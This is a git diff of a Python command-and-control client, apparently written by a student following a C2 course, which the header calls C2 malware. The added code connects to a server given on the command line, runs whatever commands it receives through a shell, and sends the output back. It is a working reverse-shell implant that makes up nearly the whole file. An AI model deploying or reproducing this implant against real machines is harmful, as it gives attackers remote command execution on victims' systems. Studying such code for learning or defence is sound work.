@@ -1,6 +1,47 @@
+###########################################################################################
+# Author:      Seth J. Gibson
+# Course:      Learn by Doing - Python3 Command and Control How To Guide, by Joe Helle
+# Program:     Don't Fence Me In
+# Description: This program is the client for a C2 I am writing in my free time, following
+#                   the guidance of Joe Helle's C2 course. This is primarily a learning
+#                   experience for building large-scale projects, along with developing an 
+#                   understanding of C2 malware and a further understanding of Python 
+#                   Socket applications.
+# Theme Song:    https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
+# Changelog:    Added command-line arguments for IP and PORT
+#               Split sections of handler() into subfunctions
+#               Added fancy new banner
+###########################################################################################
+
 import socket
 import subprocess
 import os
+import sys
+
+buffer_size = 1024
+
+def banner():
+    print('\n██████╗  ██████╗ ███╗   ██╗████████╗    ███████╗███████╗███╗   ██╗ ██████╗███████╗    ███╗   ███╗███████╗    ██╗███╗   ██╗')
+    print('██╔══██╗██╔═══██╗████╗  ██║╚══██╔══╝    ██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝    ████╗ ████║██╔════╝    ██║████╗  ██║')
+    print('██║  ██║██║   ██║██╔██╗ ██║   ██║       █████╗  █████╗  ██╔██╗ ██║██║     █████╗      ██╔████╔██║█████╗      ██║██╔██╗ ██║')
+    print('██║  ██║██║   ██║██║╚██╗██║   ██║       ██╔══╝  ██╔══╝  ██║╚██╗██║██║     ██╔══╝      ██║╚██╔╝██║██╔══╝      ██║██║╚██╗██║')
+    print('██████╔╝╚██████╔╝██║ ╚████║   ██║       ██║     ███████╗██║ ╚████║╚██████╗███████╗    ██║ ╚═╝ ██║███████╗    ██║██║ ╚████║')
+    print('╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝    ╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝')
+    print('                                                                                                    by Seth Gibson        ')
+
+def comm_in():
+    print('[+] Awaiting response...')
+    message = ''
+    while True:
+        try:
+            message = sock.recv(buffer_size).decode()
+            return message
+        except Exception:
+            sock.close()
+
+def comm_out(message):
+    response = str(message).encode()
+    sock.send(response)
 
 def handler():
     print(f'[+] Connecting to {host_ip}.')
@@ -8,38 +49,29 @@ def handler():
     print(f'[+] Connected to {host_ip}.')
 
     while True:
-        try:
-            print('[+] Awaiting response...')
-            message = sock.recv(1024).decode()
-            print('[+] Message from server: ' + message)
+        message = comm_in()
+        print('[+] Message from server: ' + message)
 
-            if message == 'exit':
-                print('[-] The server has terminated the session.')
-                sock.close()
-                break
-
-            elif message.split(" ")[0] == 'cd':
-                directory = str(message.split(" ")[1])
-                os.chdir(directory)
-                current_dir = os.getcwd()
-                print(f'[+] Changed to {current_dir}')
-                sock.send(current_dir.encode())
-
-            else:
-                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output = command.stdout.read() + command.stderr.read()
-                sock.send(output)
-
-        except KeyboardInterrupt:
-            sock.close()
-            print('[-] Interrupt issued, program exit.')
-            break
-
-        except Exception:
+        if message == 'exit':
+            print('[-] The server has terminated the session.')
             sock.close()
             break
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host_ip = '127.0.0.1'
-host_port = 2222
-handler()
+        elif message.split(" ")[0] == 'cd':
+            directory = str(message.split(" ")[1])
+            os.chdir(directory)
+            current_dir = os.getcwd()
+            print(f'[+] Changed to {current_dir}')
+            comm_out(current_dir)
+
+        else:
+            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = command.stdout.read() + command.stderr.read()
+            comm_out(output.decode())
+
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host_ip = sys.argv[1]
+    host_port = int(sys.argv[2])
+    banner()
+    handler()
